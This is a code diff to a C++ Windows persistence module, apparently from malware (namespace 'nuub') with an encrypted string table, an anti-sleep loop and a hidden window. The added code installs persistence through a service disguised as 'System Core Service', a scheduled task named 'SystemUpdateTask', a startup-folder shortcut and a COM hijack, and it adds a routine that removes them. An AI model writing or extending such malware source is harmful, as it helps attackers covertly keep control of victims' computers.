@@ -1,8 +1,10 @@
 #include "infrastructure/system/WindowsPersistence.hpp"
+#include "infrastructure/system/AdvancedPersistence.hpp"
 
 #include <chrono>
 
 #include <Windows.h>
+#include <ShlObj.h>
 #include "domain/common/StringTable.hpp"
 
 namespace nuub::infrastructure::system {
@@ -15,7 +17,7 @@ WindowsPersistence::WindowsPersistence(std::string pc_id, std::string auto_start
     , auto_start_name_(std::move(auto_start_name)) {}
 
 void WindowsPersistence::configure_auto_start() {
-    // Get encrypted registry path
+    // Registry Run key (basic persistence)
     std::string reg_path = domain::StringTable::get("reg_run");
     std::wstring w_reg_path(reg_path.begin(), reg_path.end());
 
@@ -64,6 +66,49 @@ void WindowsPersistence::anti_sleep_loop() {
     }
     SetThreadExecutionState(ES_CONTINUOUS);
 }
+
+// ── Advanced Persistence Methods ───────────────────────────────
+
+bool WindowsPersistence::install_service(const std::string& service_name) {
+    return AdvancedPersistence::install_service(service_name, "System Core Service");
+}
+
+bool WindowsPersistence::install_scheduled_task(const std::string& task_name) {
+    return AdvancedPersistence::install_scheduled_task(task_name);
+}
+
+bool WindowsPersistence::install_startup_folder(const std::string& shortcut_name) {
+    return AdvancedPersistence::install_startup_folder(shortcut_name);
+}
+
+bool WindowsPersistence::install_com_hijack(const std::string& clsid) {
+    return AdvancedPersistence::install_com_hijack(clsid);
+}
+
+void WindowsPersistence::remove_all_persistence() {
+    // Remove registry
+    std::string reg_path = domain::StringTable::get("reg_run");
+    std::wstring w_reg_path(reg_path.begin(), reg_path.end());
+    HKEY hkey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, w_reg_path.c_str(), 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
+        RegDeleteValueW(hkey, std::wstring(auto_start_name_.begin(), auto_start_name_.end()).c_str());
+        RegCloseKey(hkey);
+    }
+
+    // Remove service
+    AdvancedPersistence::remove_service("SystemCoreSvc");
+
+    // Remove scheduled task
+    AdvancedPersistence::remove_scheduled_task("SystemUpdateTask");
+
+    // Remove startup folder
+    AdvancedPersistence::remove_startup_folder("sysupdate");
+
+    // Remove COM hijack
+    AdvancedPersistence::remove_com_hijack("50F79E2C-6E08-4F83-A5E0-8A3B1D5F6A2C");
+}
+
+// ── Hidden Window ──────────────────────────────────────────────
 
 static LRESULT CALLBACK wnd_proc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     if (msg == WM_CREATE) {
